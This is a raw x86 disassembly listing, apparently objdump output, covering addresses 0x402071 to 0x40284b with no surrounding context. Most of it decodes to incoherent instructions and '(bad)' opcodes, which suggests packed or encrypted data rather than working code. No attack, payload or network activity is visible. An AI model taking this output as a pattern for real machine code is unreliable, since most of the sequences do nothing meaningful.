  402071:	jae    0x402033
  402073:	push   edi
  402074:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402075:	in     eax,dx
  402076:	in     al,dx
  402077:	mov    ds:0x6b14df7b,al
  40207c:	ja     0x402046
  40207e:	jmp    0xa71ce872
  402083:	sub    bl,al
  402085:	xor    eax,0x1481957d
  40208a:	sar    BYTE PTR [ebp+0x7f5f953e],1
  402090:	dec    edi
  402091:	add    DWORD PTR [esi-0x4e],ebp
  402094:	xchg   ebp,eax
  402095:	mov    WORD PTR [ebx],gs
  402097:	(bad)  
  402098:	mov    ebp,0x4bbbf3e2
  40209d:	out    dx,al
  40209e:	popa   
  40209f:	dec    esp
  4020a0:	es sbb esp,edi
  4020a3:	or     al,0x9e
  4020a5:	and    bl,al
  4020a7:	(bad)  
  4020a8:	loope  0x4020cc
  4020aa:	sbb    BYTE PTR [ecx-0x43],al
  4020ad:	jmp    0x5c7f5cc5
  4020b2:	les    ebp,FWORD PTR [edi]
  4020b4:	out    0x94,eax
  4020b6:	adc    edx,DWORD PTR [eax]
  4020b8:	xor    BYTE PTR [edx],ch
  4020ba:	cmp    dl,dl
  4020bc:	imul   eax,ecx,0x60
  4020bf:	sar    DWORD PTR [edi+eax*1+0x71a2156b],cl
  4020c6:	cmp    BYTE PTR [ebx-0xb],bh
  4020c9:	and    DWORD PTR [esi],ebp
  4020cb:	addr16 mov ds:0xd30e,al
  4020cf:	and    eax,0x7c7cdf54
  4020d4:	in     eax,0xc6
  4020d6:	add    ebp,DWORD PTR [edx-0x2d083bdf]
  4020dc:	pusha  
  4020dd:	xor    eax,0xa7f1db86
  4020e2:	xor    DWORD PTR [edx+ebx*1-0x41bdcb81],ecx
  4020e9:	mov    ds:0x102af377,al
  4020ee:	je     0x40213d
  4020f0:	cwde   
  4020f1:	outs   dx,BYTE PTR ds:[esi]
  4020f2:	xor    DWORD PTR [edx+eiz*1],0x4e
  4020f6:	ss (bad) 
  4020f8:	cld    
  4020f9:	stos   BYTE PTR es:[edi],al
  4020fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4020fb:	daa    
  4020fc:	outs   dx,DWORD PTR ds:[esi]
  4020fd:	stc    
  4020fe:	push   edi
  4020ff:	(bad)  
  402101:	sbb    edx,DWORD PTR [ebx+0x20]
  402104:	cmp    esp,DWORD PTR [ebp+0x77d1b74f]
  40210a:	xor    edx,esi
  40210c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40210d:	fdivr  DWORD PTR [edi-0x58]
  402110:	pop    es
  402111:	dec    esi
  402112:	fnstsw WORD PTR [edx+0x4b82cc37]
  402118:	jne    0x4020cf
  40211a:	sbb    al,0x6a
  40211c:	popf   
  40211d:	pop    eax
  40211e:	rcl    DWORD PTR [edx-0x2b],cl
  402121:	push   ecx
  402122:	dec    ecx
  402123:	pop    ecx
  402124:	xor    al,0x78
  402126:	in     eax,0x17
  402128:	int3   
  402129:	add    bh,BYTE PTR [edi+ebp*8]
  40212c:	test   BYTE PTR [edi+0x67],ch
  40212f:	es sub ch,ah
  402132:	pop    es
  402133:	addr16 in eax,dx
  402135:	into   
  402136:	pop    edi
  402137:	add    eax,0xc31eaaef
  40213c:	mov    eax,ds:0x99e51750
  402141:	or     al,0x5c
  402143:	or     ch,0x29
  402146:	in     eax,0xc
  402148:	mov    ds:0x647741a5,al
  40214d:	adc    esp,DWORD PTR [eax+0x11]
  402150:	fsincos 
  402152:	or     ebp,edx
  402154:	shl    ebx,1
  402156:	xchg   edi,eax
  402157:	scas   eax,DWORD PTR es:[edi]
  402158:	adc    cl,BYTE PTR [ebp+0x4d]
  40215b:	cmp    eax,0xb03caba8
  402160:	or     eax,0x2cd03cbb
  402165:	mov    ds:0x11bd760d,eax
  40216a:	or     edx,edi
  40216c:	cli    
  40216d:	adc    edx,DWORD PTR [edx+ecx*4]
  402170:	mov    dl,0xf5
  402172:	retf   
  402173:	mov    bl,BYTE PTR [eax+0x69]
  402176:	and    DWORD PTR [esi],0x9f8ab058
  40217c:	add    DWORD PTR [edi+0x5b],0x96905685
  402183:	xor    BYTE PTR [edi-0x80],bh
  402186:	xor    eax,0xdd3dcb67
  40218b:	cmp    eax,0x260dacaf
  402190:	(bad)  
  402191:	cs inc ebx
  402193:	jl     0x4021de
  402195:	dec    ebp
  402196:	xchg   ecx,eax
  402197:	and    eax,0x9d0ffab3
  40219c:	fwait
  40219d:	jle    0x402176
  40219f:	dec    ecx
  4021a0:	arpl   WORD PTR [ecx+0x154e4592],di
  4021a6:	mov    edx,0x77337f4d
  4021ab:	jmp    0xcb73ba28
  4021b0:	adc    ah,cl
  4021b2:	ins    BYTE PTR es:[edi],dx
  4021b3:	and    al,BYTE PTR [esi+0x5f5fa4d6]
  4021b9:	icebp  
  4021ba:	mov    esp,0xe9c319ba
  4021bf:	imul   bh
  4021c1:	aas    
  4021c2:	push   es
  4021c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4021c4:	das    
  4021c5:	mov    dl,0x8e
  4021c7:	and    edi,DWORD PTR [ebp-0x175a6d84]
  4021cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4021ce:	dec    esp
  4021cf:	xchg   BYTE PTR [ebx+0x62f1ed3e],dh
  4021d5:	pop    eax
  4021d6:	adc    ebp,esp
  4021d8:	test   eax,0x402a3933
  4021dd:	addr16 sub eax,0xe8dbd62c
  4021e3:	jns    0x4021ef
  4021e5:	inc    edx
  4021e6:	mov    ecx,0x72c6e450
  4021eb:	loope  0x4021dd
  4021ed:	cld    
  4021ee:	aad    0xed
  4021f0:	into   
  4021f1:	jnp    0x4021cd
  4021f3:	cwde   
  4021f4:	mov    dh,0x48
  4021f6:	addr16 ja 0x402188
  4021f9:	xlat   BYTE PTR ds:[ebx]
  4021fa:	retf   0x27e2
  4021fd:	icebp  
  4021fe:	data16 cmps BYTE PTR ss:[esi],BYTE PTR es:[edi]
  402201:	push   edi
  402202:	sub    ah,al
  402204:	fsub   DWORD PTR [eax]
  402206:	outs   dx,BYTE PTR ds:[esi]
  402207:	adc    al,0x92
  402209:	sbb    ah,BYTE PTR [ebp+0xb]
  40220c:	mov    edi,DWORD PTR [edx]
  40220e:	cmp    BYTE PTR [esi-0x232394e6],bl
  402214:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402215:	mov    dl,ch
  402217:	sbb    ch,cl
  402219:	add    BYTE PTR [eax],0xc9
  40221c:	cmp    eax,eax
  40221e:	mov    ebx,0xbd00e7b3
  402223:	push   0xffffff9f
  402225:	mov    cl,0xa8
  402227:	jns    0x402267
  402229:	test   esi,esi
  40222b:	ss dec esp
  40222d:	popf   
  40222e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40222f:	push   esi
  402230:	adc    dh,BYTE PTR [ecx-0xa]
  402233:	sbb    edx,DWORD PTR [ebp*4-0x5ba379b7]
  40223a:	enter  0x5e7,0x79
  40223e:	push   es
  40223f:	mov    al,ds:0x4ed5f07b
  402244:	pushf  
  402245:	sbb    BYTE PTR [edx-0x7a],bh
  402248:	mov    ds:0x2833c943,al
  40224d:	inc    ebp
  40224e:	sub    DWORD PTR [ebp+0x2dd296e0],esi
  402254:	sub    ecx,edi
  402256:	shr    BYTE PTR [esp+esi*4],cl
  402259:	push   eax
  40225a:	and    dl,BYTE PTR [ecx-0x5a]
  40225d:	inc    esp
  40225e:	pop    esi
  40225f:	or     BYTE PTR [ecx+ecx*2+0x215d2506],bl
  402266:	ror    BYTE PTR [esp+eiz*4],cl
  402269:	jp     0x4022b2
  40226b:	or     eax,0x3c49b746
  402270:	mov    bl,0x55
  402272:	inc    BYTE PTR [ebp+0x39b88a60]
  402278:	ret    0x1088
  40227b:	or     edx,esp
  40227d:	push   edi
  40227e:	xor    DWORD PTR [edx+0xcb179c9],ecx
  402284:	and    BYTE PTR [ebp+0x41],ah
  402287:	sbb    ebx,eax
  402289:	mov    dh,0xc5
  40228b:	sbb    ebp,DWORD PTR [edi+0x56]
  40228e:	imul   edi,DWORD PTR [di+0x5ab9],0x38
  402294:	sar    DWORD PTR [ebx],1
  402296:	popf   
  402297:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402298:	sbb    dl,al
  40229a:	push   edx
  40229b:	pop    edi
  40229c:	call   0x9683:0x2b7aac
  4022a3:	jmp    0x402257
  4022a5:	xor    eax,esi
  4022a7:	and    DWORD PTR ds:0x42a9d1,0x42aa15
  4022b1:	add    eax,edi
  4022b3:	cmp    DWORD PTR [ecx],eax
  4022b5:	jne    0x402dc8
  4022bb:	mov    eax,DWORD PTR [ebp+0x8]
  4022be:	mov    ecx,DWORD PTR [ebp-0x18]
  4022c1:	sbb    DWORD PTR ds:0x42aa95,0x2700
  4022cb:	xor    eax,esi
  4022cd:	add    eax,edi
  4022cf:	jmp    0x40256e
  4022d4:	xlat   BYTE PTR ds:[ebx]
  4022d5:	cmp    eax,0xd9d5d1c7
  4022da:	fxch   st(1)
  4022dc:	mov    edi,0x86682c5b
  4022e1:	push   ss
  4022e2:	cdq    
  4022e3:	cmp    DWORD PTR [ecx+ecx*1],eax
  4022e6:	js     0x402360
  4022e8:	(bad)  
  4022e9:	jle    0x402363
  4022eb:	js     0x40228a
  4022ed:	sbb    bh,bh
  4022ef:	add    edx,DWORD PTR [ecx]
  4022f1:	cmc    
  4022f2:	shr    BYTE PTR [ebp+ebp*2-0x1d],0x3d
  4022f7:	or     DWORD PTR [ecx],edi
  4022f9:	mov    esp,0x537c2976
  4022fe:	iret   
  4022ff:	pop    ebp
  402300:	icebp  
  402301:	sbb    al,0x9
  402303:	mov    esi,0x8153c1eb
  402308:	adc    BYTE PTR [esi],cl
  40230a:	pop    ebx
  40230b:	sti    
  40230c:	pop    ecx
  40230d:	push   ebx
  40230e:	inc    edi
  40230f:	add    al,0x40
  402311:	mov    ch,BYTE PTR [esi+0x4f]
  402314:	dec    esi
  402315:	mov    al,ds:0x7b32d104
  40231a:	loopne 0x402352
  40231c:	cli    
  40231d:	and    edi,DWORD PTR [ecx+0x19]
  402320:	cmp    edx,DWORD PTR [eax]
  402322:	gs xchg edi,eax
  402324:	adc    BYTE PTR [ecx+edx*1-0x28],ch
  402328:	sbb    ch,bl
  40232a:	cmp    BYTE PTR [esp+edx*4-0x4c],dh
  40232e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40232f:	add    al,0xd6
  402331:	jbe    0x4023b2
  402333:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402334:	sub    edx,DWORD PTR [edx+0x76]
  402337:	retf   0x9268
  40233a:	mov    bh,0x40
  40233c:	bound  eax,QWORD PTR [ecx-0x47]
  40233f:	xchg   edx,eax
  402340:	jb     0x4023b2
  402342:	aad    0x84
  402344:	adc    edi,DWORD PTR [eax]
  402346:	xor    eax,0xe39cfd21
  40234b:	jae    0x40235f
  40234d:	jle    0x402375
  40234f:	icebp  
  402350:	adc    DWORD PTR [ecx-0x7c],eax
  402353:	outs   dx,BYTE PTR ds:[esi]
  402354:	mov    esi,0x24f0a1ac
  402359:	test   eax,0xae09c77
  40235f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402360:	jmp    0x402337
  402362:	xor    eax,eax
  402364:	jb     0x40236b
  402366:	fisttp QWORD PTR [eax]
  402368:	push   esp
  402369:	add    al,0x31
  40236b:	pop    esp
  40236c:	sbb    al,0x23
  40236e:	and    al,0xe5
  402370:	addr16 xchg edx,eax
  402372:	nop
  402373:	mov    ds:0x57afd03e,al
  402378:	mov    WORD PTR [ebx-0x7a],ss
  40237b:	repnz popa 
  40237d:	outs   dx,BYTE PTR ds:[esi]
  40237e:	test   al,0x37
  402380:	mov    bl,0xfc
  402382:	lock cmp edi,DWORD PTR [ebp+0x3]
  402386:	mov    ebp,0x2dea2ea
  40238b:	xchg   edx,eax
  40238c:	xchg   ecx,eax
  40238d:	icebp  
  40238e:	ret    
  40238f:	out    dx,al
  402390:	mov    BYTE PTR [esi],dl
  402392:	pop    ebx
  402393:	jmp    0x40239c
  402395:	dec    edi
  402396:	(bad)  
  402397:	cmc    
  402398:	jo     0x4023bd
  40239a:	fadd   QWORD PTR [eax+eax*4]
  40239d:	(bad)  
  40239f:	push   ebp
  4023a0:	das    
  4023a1:	sub    eax,0x203fb894
  4023a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4023a7:	mov    edi,0x478c7b42
  4023ac:	enter  0x1502,0x45
  4023b0:	pop    ecx
  4023b1:	cmp    eax,0x6fbe069d
  4023b6:	pop    eax
  4023b7:	inc    ebp
  4023b8:	jmp    0x7453ff7b
  4023bd:	in     eax,0xce
  4023bf:	xor    cl,dl
  4023c1:	add    dh,dl
  4023c3:	xchg   ch,al
  4023c5:	sbb    dh,bl
  4023c7:	sar    BYTE PTR [edx-0x17cc6b3b],1
  4023cd:	stos   DWORD PTR es:[edi],eax
  4023ce:	outs   dx,BYTE PTR ds:[esi]
  4023cf:	push   eax
  4023d0:	inc    esi
  4023d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4023d2:	loopne 0x40236a
  4023d4:	adc    eax,0x3d53e3b
  4023d9:	test   BYTE PTR [esi+0x7a],ch
  4023dc:	mul    BYTE PTR [edi]
  4023de:	add    dh,BYTE PTR ds:0x610b9476
  4023e4:	push   0xffffffa4
  4023e6:	lds    edi,FWORD PTR [esi-0x4651933b]
  4023ec:	or     ebx,ecx
  4023ee:	shl    DWORD PTR [esp+ebx*1],1
  4023f1:	aam    0xa2
  4023f3:	lods   eax,DWORD PTR cs:[esi]
  4023f5:	xchg   BYTE PTR [edx+0x41d1c6af],bl
  4023fb:	and    ebp,DWORD PTR ds:0x4aff6329
  402401:	xchg   BYTE PTR [ebx],bh
  402403:	add    dl,bl
  402405:	(bad)  
  402406:	cld    
  402407:	test   al,0xae
  40240a:	aad    0xe1
  40240c:	loope  0x402454
  40240e:	mov    ecx,0xcbb38452
  402413:	in     al,0x78
  402415:	push   esp
  402416:	push   es
  402417:	fwait
  402418:	lds    ebp,FWORD PTR [ecx+0x48]
  40241b:	mov    dl,0x79
  40241d:	adc    DWORD PTR [ebp+eiz*1-0x65b184b3],edx
  402424:	int    0x72
  402426:	add    dh,BYTE PTR [edi+0x356dd86]
  40242c:	out    0x62,eax
  40242e:	mov    bh,0x8a
  402430:	outs   dx,DWORD PTR ds:[esi]
  402431:	jecxz  0x402489
  402433:	adc    bh,BYTE PTR [esi-0x2b]
  402436:	pop    ds
  402437:	xlat   BYTE PTR ds:[ebx]
  402438:	sbb    eax,DWORD PTR gs:[esp+esi*8]
  40243c:	pushf  
  40243d:	pushf  
  40243e:	push   edi
  40243f:	inc    esp
  402440:	cmp    BYTE PTR [ecx+0x69951d39],bh
  402446:	pusha  
  402447:	leave  
  402448:	adc    bh,bh
  40244a:	xchg   BYTE PTR [ecx],dl
  40244c:	fnstsw WORD PTR [eax-0x15831fba]
  402452:	or     BYTE PTR [ebx+0x1b],bh
  402455:	pop    edi
  402456:	dec    esi
  402457:	cmp    dh,BYTE PTR [edi]
  402459:	jo     0x402495
  40245b:	daa    
  40245c:	jmp    0x5468:0x633d6824
  402463:	cmp    BYTE PTR [esi-0x1096bd19],ah
  402469:	gs sub DWORD PTR ss:[ebp+0x1d694d32],edx
  402471:	mov    esi,0x2e9664cb
  402476:	xor    ah,0x97
  402479:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40247a:	mov    eax,ds:0x6693b8da
  40247f:	and    eax,esp
  402481:	xor    al,0x24
  402483:	jmp    0x4024c2
  402485:	and    ch,bh
  402487:	jmp    0xcb6c32e1
  40248c:	sbb    al,0x38
  40248e:	mov    cl,bl
  402490:	or     dl,BYTE PTR [esi+eiz*1+0x2c]
  402494:	pop    ecx
  402495:	iret   
  402496:	popa   
  402497:	sbb    al,0x13
  402499:	xchg   edi,eax
  40249a:	ja     0x40244e
  40249c:	out    dx,eax
  40249d:	add    DWORD PTR [esi],ecx
  40249f:	out    dx,al
  4024a0:	and    al,0x48
  4024a2:	sar    DWORD PTR [ebp+0x5],0x58
  4024a6:	sbb    BYTE PTR [ebx+0x71],dl
  4024a9:	and    ecx,edi
  4024ab:	push   esi
  4024ac:	add    eax,0x67a204e7
  4024b1:	cmp    BYTE PTR [esi-0x1f7a109b],bh
  4024b7:	xchg   esp,eax
  4024b8:	cmp    bl,BYTE PTR [edx+0x62]
  4024bb:	(bad)  
  4024bd:	xchg   BYTE PTR [ebx+0x5d279b05],bh
  4024c3:	push   edx
  4024c4:	test   BYTE PTR [edx+0x76],dl
  4024c7:	inc    eax
  4024c8:	cmp    eax,0x3d2d756b
  4024cd:	xchg   edx,eax
  4024ce:	sti    
  4024cf:	bound  eax,QWORD PTR [eax+0x3f]
  4024d2:	call   0xedb2:0xb5a944b1
  4024d9:	fwait
  4024da:	stc    
  4024db:	pop    ecx
  4024dc:	mov    ecx,0xa889abd1
  4024e1:	xor    eax,0xd078f6ee
  4024e6:	cmp    DWORD PTR [esi+0x7],0x74e23274
  4024ed:	pop    ds
  4024ee:	loopne 0x402564
  4024f0:	xlat   BYTE PTR ds:[ebx]
  4024f1:	lods   al,BYTE PTR ds:[esi]
  4024f2:	xor    al,0xea
  4024f4:	mov    eax,ds:0x8f0d68ad
  4024f9:	loopne 0x4024f2
  4024fb:	scas   al,BYTE PTR es:[edi]
  4024fc:	stos   DWORD PTR es:[edi],eax
  4024fd:	popa   
  4024fe:	xor    al,BYTE PTR [edx+edx*4+0x1227bb51]
  402505:	adc    BYTE PTR [ecx+0x33b3b956],al
  40250b:	fs scas al,BYTE PTR es:[edi]
  40250d:	out    0x15,al
  40250f:	sub    al,al
  402511:	lods   al,BYTE PTR ds:[esi]
  402512:	(bad)  
  402513:	outs   dx,DWORD PTR ds:[esi]
  402514:	cmp    ah,BYTE PTR [edi]
  402516:	mov    eax,0x25ce652a
  40251b:	(bad)  
  40251c:	out    0xfb,eax
  40251e:	stc    
  40251f:	mov    esp,0x6a5c6164
  402524:	ds jecxz 0x4024bb
  402527:	std    
  402528:	bound  ebp,QWORD PTR [ecx]
  40252a:	outs   dx,DWORD PTR ds:[esi]
  40252b:	cwde   
  40252c:	mov    edi,0xad28a52f
  402531:	mov    eax,ds:0x21914b39
  402536:	and    ah,bh
  402538:	es push es
  40253a:	push   ss
  40253b:	daa    
  40253c:	popa   
  40253d:	fadd   DWORD PTR [esi]
  40253f:	mov    al,0xde
  402541:	sti    
  402542:	add    DWORD PTR [ecx],esp
  402544:	mov    ?,ebx
  402546:	mov    edi,0x8acedeb5
  40254b:	add    cl,BYTE PTR [edx-0x35]
  40254e:	cs jns 0x402567
  402551:	stos   BYTE PTR es:[edi],al
  402552:	mov    dh,0xb8
  402554:	mov    edx,0x3cd6f2ed
  402559:	inc    esp
  40255a:	mov    cl,0xc5
  40255c:	pop    ecx
  40255d:	ins    DWORD PTR es:[edi],dx
  40255e:	mov    eax,ds:0x9d612e80
  402563:	dec    ebp
  402564:	inc    ebp
  402565:	shl    BYTE PTR [ebp-0x16],1
  402568:	mov    ah,0xd9
  40256a:	adc    cl,0x22
  40256d:	xchg   BYTE PTR [ecx],bh
  40256f:	add    DWORD PTR [edi],ecx
  402571:	test   DWORD PTR [edx+eax*1+0x458b0000],edi
  402578:	or     BYTE PTR [ebx-0x39cc0fb3],cl
  40257e:	add    eax,edi
  402580:	mov    DWORD PTR [ecx],eax
  402582:	jmp    0x402821
  402587:	aas    
  402588:	retf   
  402589:	ret    0xcace
  40258c:	aad    0xd3
  40258e:	fld    DWORD PTR [ecx+eiz*1+0x26]
  402592:	inc    edx
  402593:	mov    ebp,0x8a19f2a6
  402598:	vmread DWORD PTR [eax-0x2],edi
  40259c:	jle    0x402616
  40259e:	js     0x4025a5
  4025a0:	cmp    al,ch
  4025a2:	add    DWORD PTR [esi-0x3b],edi
  4025a5:	or     eax,0xffffffd0
  4025a8:	xchg   ebp,eax
  4025a9:	mov    esi,0x78b7dcb5
  4025ae:	cdq    
  4025af:	mov    WORD PTR [eax],?
  4025b1:	mov    esp,0xd972da94
  4025b6:	out    0x57,eax
  4025b8:	call   0x855ee4bd
  4025bd:	loope  0x402548
  4025bf:	adc    DWORD PTR [ecx],edi
  4025c1:	push   edx
  4025c2:	push   esi
  4025c3:	add    dl,BYTE PTR ds:0xa9420c36
  4025c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4025ca:	test   eax,0x155fa80e
  4025cf:	ss mov esi,0x87de1fec
  4025d5:	push   esp
  4025d6:	jmp    0x4b5a0a42
  4025db:	fcom   DWORD PTR ds:0x6e4aea13
  4025e1:	xchg   edi,eax
  4025e2:	adc    eax,0x79e63265
  4025e7:	aad    0x28
  4025e9:	shl    BYTE PTR [ecx],1
  4025eb:	loopne 0x4025eb
  4025ed:	pop    esp
  4025ee:	das    
  4025ef:	mov    BYTE PTR [eax+eax*1],bh
  4025f2:	push   ebx
  4025f3:	mov    dh,0x71
  4025f5:	jb     0x402594
  4025f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4025f8:	jge    0x402642
  4025fa:	pop    eax
  4025fb:	pop    ss
  4025fc:	dec    esi
  4025fd:	sub    edi,DWORD PTR [ecx+0x359ed4dd]
  402603:	sub    BYTE PTR [ebx+0xa],0x66
  402607:	jb     0x40265c
  402609:	xor    DWORD PTR [edx+edx*2-0x32],ebx
  40260d:	lea    esi,[eax]
  40260f:	(bad)  
  402610:	push   esp
  402611:	add    eax,0x481c221e
  402616:	fs sbb dh,0xfb
  40261a:	inc    eax
  40261b:	xlat   BYTE PTR ds:[ebx]
  40261c:	inc    ebp
  40261d:	dec    edx
  40261e:	cmp    BYTE PTR [esi],0x60
  402621:	cmp    al,ah
  402623:	cmp    ah,0xe3
  402626:	cli    
  402627:	xor    al,0x68
  402629:	pop    ebx
  40262a:	and    bl,dh
  40262c:	cmp    dh,BYTE PTR [eax]
  40262e:	pop    ebx
  40262f:	enter  0x4188,0xf2
  402633:	adc    DWORD PTR [esi-0x19a99fbd],edx
  402639:	jl     0x4025e6
  40263b:	pop    es
  40263c:	and    al,0x95
  40263e:	test   eax,0xa43891e8
  402643:	and    ch,BYTE PTR [eax-0xc8e0dc8]
  402649:	sbb    BYTE PTR [ebx+0x3e],0x8d
  40264d:	stos   DWORD PTR es:[edi],eax
  40264e:	dec    esp
  40264f:	(bad)  
  402650:	(bad)  
  402652:	sub    DWORD PTR [edx-0xd],0xa06b46a3
  402659:	(bad)  
  40265a:	je     0x402647
  40265c:	xor    al,0x11
  40265e:	jno    0x4025ed
  402660:	ins    DWORD PTR es:[edi],dx
  402661:	or     BYTE PTR ds:0x513e2eb4,cl
  402667:	in     eax,0x73
  402669:	pop    edi
  40266a:	fstp   DWORD PTR [edi+0x1bef65e7]
  402670:	add    eax,0xecff0a64
  402675:	jecxz  0x40269e
  402677:	mov    ch,0x88
  402679:	les    ebp,FWORD PTR [eax]
  40267b:	dec    edx
  40267c:	cmp    eax,0x15749fa4
  402681:	push   es
  402682:	push   0x70
  402684:	add    eax,esi
  402686:	sub    BYTE PTR [ebp-0x5ddd0d53],0xd8
  40268d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40268e:	cli    
  40268f:	outs   dx,BYTE PTR ds:[esi]
  402690:	les    edx,FWORD PTR [edi]
  402692:	int    0xf6
  402694:	enter  0xf6c3,0x68
  402698:	cwde   
  402699:	add    eax,0x4e2d5d6d
  40269e:	pusha  
  40269f:	cmc    
  4026a0:	adc    bh,BYTE PTR [ecx]
  4026a2:	js     0x4026d2
  4026a4:	jmp    0x1f34:0x61ef001
  4026ab:	frstor [eax+eiz*2-0x884b0f]
  4026b2:	mov    ds:0x2ff8f708,eax
  4026b7:	mov    ebp,DWORD PTR [ebx+ecx*2-0x341770d0]
  4026be:	sbb    al,0xbf
  4026c0:	mov    dh,0x2
  4026c2:	ror    DWORD PTR es:[eax],cl
  4026c5:	int3   
  4026c6:	or     eax,0x991942ba
  4026cb:	std    
  4026cc:	xchg   DWORD PTR [ebx],eax
  4026ce:	int3   
  4026cf:	pusha  
  4026d0:	dec    eax
  4026d1:	out    dx,eax
  4026d2:	sahf   
  4026d3:	in     eax,dx
  4026d4:	cli    
  4026d5:	push   edx
  4026d6:	and    BYTE PTR [ebx-0x16],bl
  4026d9:	ja     0x4026e5
  4026db:	int    0x3d
  4026dd:	ret    
  4026de:	xor    DWORD PTR [eax],esp
  4026e0:	(bad)  
  4026e1:	repz add edx,DWORD PTR ds:0x1389341b
  4026e8:	pop    ecx
  4026e9:	loop   0x402736
  4026eb:	fidivr DWORD PTR [eax]
  4026ed:	xor    edi,DWORD PTR [ecx+eax*1+0x336ed12d]
  4026f4:	inc    edx
  4026f5:	mov    ebx,0x3824e21d
  4026fa:	fsub   st,st(7)
  4026fc:	mov    dh,0xfb
  4026fe:	fild   WORD PTR [edx]
  402700:	call   0x1508:0x23f523d8
  402707:	das    
  402708:	pop    esi
  402709:	dec    esi
  40270a:	repnz out dx,al
  40270c:	adc    cl,ah
  40270e:	rcl    DWORD PTR [ecx],1
  402710:	xor    ebp,DWORD PTR [edi-0x178b4e1d]
  402716:	jne    0x4026a6
  402718:	in     al,0x21
  40271a:	mov    DWORD PTR [ebp-0x2f],edx
  40271d:	mov    cl,0xad
  40271f:	sbb    eax,0x73b15344
  402724:	jge    0x40276c
  402726:	lods   eax,DWORD PTR ds:[esi]
  402727:	test   al,al
  402729:	ret    
  40272a:	sti    
  40272b:	sar    BYTE PTR [ebx],cl
  40272d:	or     BYTE PTR [eax-0x66493dac],dl
  402733:	and    dh,BYTE PTR [esp+eiz*4-0x159b92e0]
  40273a:	enter  0x3277,0xe2
  40273e:	cmp    al,0xd3
  402740:	adc    BYTE PTR [eax-0x3c],bh
  402743:	inc    eax
  402744:	cmp    eax,DWORD PTR [esi+0x2b2654e9]
  40274a:	les    ebx,FWORD PTR [esi-0x5eb0c06d]
  402750:	jmp    0x4026d7
  402752:	daa    
  402753:	cmp    al,0x85
  402755:	std    
  402756:	rol    DWORD PTR [eax+0x67c5c995],0xe7
  40275d:	shl    BYTE PTR [ebx],0x6b
  402760:	popa   
  402761:	jbe    0x4027b8
  402763:	fist   WORD PTR [eax+0x57]
  402766:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402767:	fisub  WORD PTR [esi-0x9]
  40276b:	and    DWORD PTR [ecx+0x4c],0xd0001261
  402772:	or     ebp,DWORD PTR [edi-0x6f861d58]
  402778:	xchg   DWORD PTR [ecx+edi*1+0x12],eax
  40277c:	xchg   ebx,eax
  40277d:	mov    esp,0xbed006f9
  402782:	mov    ecx,0x8bde6e2b
  402787:	mov    dh,0x2e
  402789:	add    al,0xf2
  40278b:	xchg   ebp,eax
  40278c:	or     al,0x7e
  40278e:	test   cl,0x7e
  402791:	sbb    DWORD PTR [ebp+0x1],ebp
  402794:	bound  esp,QWORD PTR [ebp+0x7f]
  402797:	mov    al,0x85
  402799:	pop    ds
  40279a:	pop    edx
  40279b:	mov    edi,0x77bf9ad
  4027a0:	or     BYTE PTR [ebp+0x43],ch
  4027a3:	stc    
  4027a4:	sub    DWORD PTR [ecx-0x2a],ebp
  4027a7:	mov    ds:0x3896b4e7,eax
  4027ac:	icebp  
  4027ad:	lods   eax,DWORD PTR ds:[esi]
  4027ae:	fisttp DWORD PTR [ecx]
  4027b0:	mov    ah,0x99
  4027b2:	push   edi
  4027b3:	sti    
  4027b4:	and    al,0x52
  4027b6:	inc    ebp
  4027b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4027b8:	sahf   
  4027b9:	jbe    0x34ba15c2
  4027bf:	xchg   ebx,eax
  4027c0:	mov    bh,0x54
  4027c2:	jnp    0x4027a4
  4027c4:	or     eax,0x22b20d5
  4027c9:	jb     0x40275c
  4027cb:	xor    ebp,0x15e7c3a1
  4027d1:	sbb    al,0xcf
  4027d3:	out    0x5a,eax
  4027d5:	cmc    
  4027d6:	loop   0x402851
  4027d8:	je     0x402843
  4027da:	xor    esp,edi
  4027dc:	jno    0x402802
  4027de:	out    0xb1,al
  4027e0:	lock push eax
  4027e2:	mov    ebp,0xc6d4ff48
  4027e7:	inc    DWORD PTR [edx]
  4027e9:	aas    
  4027ea:	mov    dh,0x2
  4027ec:	lahf   
  4027ed:	aam    0xb2
  4027ef:	adc    eax,0x733044a5
  4027f4:	jg     0x4027fc
  4027f6:	jmp    0x402806
  4027f8:	pop    esp
  4027f9:	ror    BYTE PTR [edx+0x51cc4d1a],cl
  4027ff:	imul   ebx,DWORD PTR [eax-0x30ff2675],0x24
  402806:	aas    
  402807:	mov    cl,0x4c
  402809:	leave  
  40280a:	mov    ah,0xbf
  40280c:	inc    esi
  40280d:	imul   eax,esp,0xeb571cb3
  402813:	popf   
  402814:	fdivr  st(7),st
  402816:	add    BYTE PTR [eax+0x6b],bl
  402819:	cld    
  40281a:	in     eax,0x26
  40281c:	loop   0x4027cd
  40281e:	push   es
  40281f:	or     BYTE PTR [edi-0x740fba75],ch
  402825:	dec    ebp
  402826:	adc    BYTE PTR [ebx],dh
  402828:	into   
  402829:	mov    edx,0xffcd8d68
  40282e:	sub    edx,ecx
  402830:	add    DWORD PTR [eax],edx
  402832:	mov    eax,ds:0x41ebba
  402837:	mov    eax,DWORD PTR [eax]
  402839:	mov    cx,WORD PTR [ebp-0x4]
  40283d:	movzx  ecx,cx
  402840:	add    ecx,DWORD PTR [eax]
  402842:	mov    DWORD PTR [ebp-0x18],ecx
  402845:	mov    eax,DWORD PTR [ebp+0xc]
  402848:	mov    ecx,DWORD PTR [ebp+0xc]
  40284b:	xor    eax,esi
